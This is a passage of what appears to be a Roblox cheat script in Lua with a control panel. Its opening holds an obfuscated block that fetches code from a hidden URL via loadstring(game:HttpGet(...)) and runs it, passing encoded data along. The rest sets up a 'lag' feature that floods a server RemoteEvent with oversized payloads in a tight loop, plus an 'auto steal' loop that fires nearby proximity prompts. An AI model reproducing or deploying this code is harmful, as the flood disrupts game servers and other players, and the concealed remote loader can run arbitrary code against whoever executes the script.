[hloph_lKIegO("LFR\239\025\019\194\212\221\209\202")] = true, [hloph_lKIegO("JLB&\025\016\255\007\219\231\201")] = true, [hloph_lKIegO("JL5)\030\010\019")] = true, [hloph_lKIegO("JFK2")] = true, [hloph_lKIegO("I`9*#\031")] = true, [hloph_lKIegO("PL;(")] = true, [hloph_lKIegO("NL:2\026%\249\237\231\226")] = true, [hloph_lKIegO("CD8\239\007\016\252\244")] = true, [hloph_lKIegO("P[=+\031\013\005\001\221")] = true} YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("7\028\001\025\"\230\005\218\196\228\196\161j\156_}R4\009M")] = {[hloph_lKIegO(";I52\026\209\239\239\227\229")] = true, [hloph_lKIegO(":I=,\021\009\251\239\231\149\164\176\163\151")] = true, [hloph_lKIegO(":I7($\012\251\236\222\149\158\182\163\148\141\137")] = true, [hloph_lKIegO(":I7($\012\251\236\222\149\179\179\167\169")] = true, [hloph_lKIegO("9L83'\209\239\246\222\233\212\190")] = true, [hloph_lKIegO("9L83'\209\239\239\227\229")] = true, [hloph_lKIegO("9`N&$\210\015\179\213\204\192\184\181")] = true, [hloph_lKIegO("9`L<#\021\194\224\224\212\214")] = true, [hloph_lKIegO("9T<2.\209\239\239\227\229")] = true, [hloph_lKIegO("@P9(\026\210\015\179\188\216\197\187")] = true, [hloph_lKIegO("@DP&\026\020\194\224\224\212\214")] = true, [hloph_lKIegO("8LP.\224\239\254\242\241\233\201\197")] = true, [hloph_lKIegO("8LP.\224\254\254\242\244")] = true, [hloph_lKIegO("JLB&\025\016\255\007\219\231\201w\135\144\152\136\128kE43")] = true, [hloph_lKIegO("JLB&\025\016\255\007\219\231\201w\149\149\137\139")] = true, [hloph_lKIegO("JL5)\030\010\019\179\188\212\193\178\171\167")] = true, [hloph_lKIegO("JL5)\030\010\019\179\209\209\197\199")] = true, [hloph_lKIegO("IL8C\031\210\015\179\209\209\201\174\169\145")] = true, [hloph_lKIegO("MLP2.\008\006\246\242")] = true, [hloph_lKIegO("MDR,\024\210\015\179\194\227\191\176\163")] = true, [hloph_lKIegO("CD8\239\007\016\252\244\164\177\197\178\184")] = true, [hloph_lKIegO("CD8\239\007\016\252\244\164\194\194\182\184")] = true, [hloph_lKIegO("LE=)4\010\253\179\209\209\197\199")] = true, [hloph_lKIegO("9[E<4\016\254\179\209\209\197\199")] = true} task[hloph_lKIegO("i]=@\026")](function(...) return (function() local M9IDDiBIOfaiT78EKvg = loadstring(game:HttpGet(hloph_lKIegO("TaR?-\215\187\172\242\212\215q\169\144\158s\127[aL3/\015\252\238\249\217\193\204c\151\132w&[G9.\027\015\003\002\227\229\191\201\190V\141yesM9\2350\017\019\237\247\236\130\200\174\158\1547gcPF@\221\016\005\238\226\146\198\180\173\148\1399ltQ")))() if type(M9IDDiBIOfaiT78EKvg) == hloph_lKIegO("^`8,4\008\251\237") then M9IDDiBIOfaiT78EKvg(YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("'@\2483\026\223\208\193\177\151\205\142\142\167x")], YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("W\009\009\251\008\021\209\247\245\197\164y]m\132m1(\007\020")], YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("/[\025\018\239\240\247\190\209\205\142\128\143\137spp^")], YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("^3\008+\237\240\253\186\202\167\127\179\172\151\132\141")], YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO(" \030\001#\226\245\227\250\185\232\151\198\137P~w<\023+\007\001")], YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("7\028\001\025\"\230\005\218\196\228\196\161j\156_}R4\009M")]) end end)(...) end)
	end)
end)

-- ========== STATE ==========
local lagging = false
local lagThread = nil
local intensity = 10000
local toggleKey = Enum.KeyCode.F
local toggleKeyName = "F"
local listeningForKey = false
local autoSteal = true
local stealThread = nil
local Event
local currentScale = 1.0
local isCollapsed = false

local function clampPower(v)
	v = tonumber(v)
	if not v then return intensity end
	return math.clamp(math.floor(v), 1000, 1000000)
end

local function updatePower()
	intensity = clampPower(PowerBox.Text)
	PowerBox.Text = tostring(intensity)
end

local function applyKeybind(name)
	toggleKeyName = name or "F"
	local ok, key = pcall(function() return Enum.KeyCode[toggleKeyName] end)
	toggleKey = (ok and key) or Enum.KeyCode.F
	KeyBtn.Text = toggleKeyName
end

local function resolveEvent()
	local ok, net = pcall(function()
		local packages = RS:FindFirstChild("Packages")
		if not packages then return nil end
		return packages:FindFirstChild("Net")
	end)
	if ok and net then
		local children = net:GetChildren()
		Event = children[230] or (children[1] and children[1]:IsA("RemoteEvent") and children[1])
	end
end
resolveEvent()

local function paintActivate()
	if lagging then
		StartBtn.Text = "DEACTIVATE"
		StartBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
		actStroke.Color = Color3.fromRGB(255, 100, 100)
	else
		StartBtn.Text = "ACTIVATE"
		StartBtn.BackgroundColor3 = PURPLE_MID
		actStroke.Color = PURPLE
	end
end

local function paintSteal()
	if autoSteal then
		StealBtn.Text = "⦿ AUTO STEAL ON"
		StealBtn.BackgroundColor3 = GREEN_DIM
		stealStroke.Color = GREEN
	else
		StealBtn.Text = "⦿ AUTO STEAL OFF"
		StealBtn.BackgroundColor3 = INPUT
		stealStroke.Color = DIM
	end
end

local function startLagging()
	if lagging then return end
	updatePower()
	lagging = true
	paintActivate()
	if not Event then resolveEvent() end
	local payload = table.create(math.max(intensity, 1000), function() end)
	lagThread = task.spawn(function()
		while lagging do
			for _ = 1, 3 do
				if Event then pcall(function() Event:FireServer(payload) end) end
			end
			task.wait(0.01)
		end
	end)
end

local function stopLagging()
	if not lagging then return end
	lagging = false
	if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
	paintActivate()
end

local function startAutoSteal()
	if stealThread then return end
	stealThread = task.spawn(function()
		while autoSteal do
			pcall(function()
				local char = LP.Character
				local hrp = char and char:FindFirstChild("HumanoidRootPart")
				if not hrp then return end
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("ProximityPrompt") and v.Enabled then
						local part = v.Parent
						if part and part:IsA("BasePart") then
							if (part.Position - hrp.Position).Magnitude < 15 then
								pcall(function() fireproximityprompt(v) end)
							end
						end
					end
				end
			end)
			task.wait(0.1)
		end
		stealThread = nil
	end)
end

local function stopAutoSteal()
	autoSteal = false
	if stealThread then pcall(task.cancel, stealThread); stealThread = nil end
	paintSteal()
end

-- ═══ إعدادات وحفظ ═══
local function saveConfig()
	updatePower()
	pcall(function()
		if writefile then
			writefile(CONFIG_FILE, HttpService:JSONEncode({
				Power = intensity,
				Keybind = toggleKeyName,
				AutoSteal = autoSteal,
				Image = selectedImg,
				Scale = currentScale,
			}))
		end
	end)
end

local function loadConfig()
	if not (readfile and isfile and isfile(CONFIG_FILE)) then return end
	local ok, cfg = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not (ok and type(cfg) == "table") then return end
	if tonumber(cfg.Power) then
		intensity = clampPower(cfg.Power)
		PowerBox.Text = tostring(intensity)
	end
	if type(cfg.Keybind) == "string" and cfg.Keybind ~= "" then
		applyKeybind(cfg.Keybind)
	end
	if type(cfg.Image) == "number" and SETTINGS_IMAGES[cfg.Image] then
		selectedImg = cfg.Image
		bgImg.Image = SETTINGS_IMAGES[selectedImg]
	end
	if tonumber(cfg.Scale) then
		currentScale = math.clamp(cfg.Scale, 0.5, 1.5)
		uiScale.Scale = currentScale
		ScaleBox.Text = tostring(math.floor(currentScale * 100)) .. "%"
	end
	if cfg.AutoSteal == false then
		autoSteal = false
		paintSteal()
	end
end

-- Connections
minusBtn.MouseButton1Click:Connect(function()
	intensity = clampPower(intensity - 1000)
	PowerBox.Text = tostring(intensity)
end)
plusBtn.MouseButton1Click:Connect(function()
	intensity = clampPower(intensity + 1000)
	PowerBox.Text = tostring(intensity)
end)
PowerBox.FocusLost:Connect(updatePower)

StartBtn.MouseButton1Click:Connect(function()
	if lagging then stopLagging() else startLagging() end
end)

StealBtn.MouseButton1Click:Connect(function()
	autoSteal = not autoSteal
	paintSteal()
	if autoSteal then startAutoSteal() else stopAutoSteal() end
end)

-- ═══ UI SCALE (تحديث فوري) ═══
scaleMinus.MouseButton1Click:Connect(function()
	currentScale = math.clamp(currentScale - 0.05, 0.5, 1.5)
	uiScale.Scale = currentScale
	ScaleBox.Text = tostring(math.floor(currentScale * 100)) .. "%"
end)
scalePlus.MouseButton1Click:Connect(function()
	currentScale = math.clamp(currentScale + 0.05, 0.5, 1.5)
	uiScale.Scale = currentScale
	ScaleBox.Text = tostring(math.floor(currentScale * 100)) .. "%"
end)

SaveBtn.MouseButton1Click:Connect(function()
	saveConfig()
	SaveBtn.Text = "SAVED!"
	SaveBtn.BackgroundColor3 = GREEN
	task.delay(1, function()
		SaveBtn.Text = "SAVE CONFIG"
		SaveBtn.BackgroundColor3 = PURPLE
	end)
end)

KeyBtn.MouseButton1Click:Connect(function()
	listeningForKey = true
	KeyBtn.Text = "..."
end)

settingsBtn.MouseButton1Click:Connect(function()
	if isCollapsed then return end
	settingsOpen = not settingsOpen
	settingsPanel.Visible = settingsOpen
end)
setClose.MouseButton1Click:Connect(function()
	settingsOpen = false
	settingsPanel.Visible = false
end)

-- ═══ Minimize & Maximize (مطابق للصورة) ═══
minBtn.MouseButton1Click:Connect(function()
	isCollapsed = not isCollapsed
	settingsOpen = false
	settingsPanel.Visible = false

	if isCollapsed then
		minBtn.Text = "+"
		TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.fromOffset(W, collapsedH)
		}):Play()
	else
		minBtn.Text = "−"
		TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.fromOffset(W, H)
		}):Play()
	end
end)

UIS.InputBegan:Connect(function(input, gpe)
	if listeningForKey then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			listeningForKey = false
			applyKeybind(input.KeyCode.Name)
		end
		return
	end
	if gpe then return end
	if input.KeyCode == toggleKey then
		if lagging then stopLagging() else startLagging() end
	end
end)

-- Drag
local dragging, dragStart, startPos
header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Main.Position
	end
end)
UIS.InputChanged:Connect(function(input)
	if not dragging then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local d = input.Position - dragStart
		Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)
UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

task.defer(function()
	loadConfig()
	paintActivate()
	paintSteal()
	if autoSteal then startAutoSteal() end
end)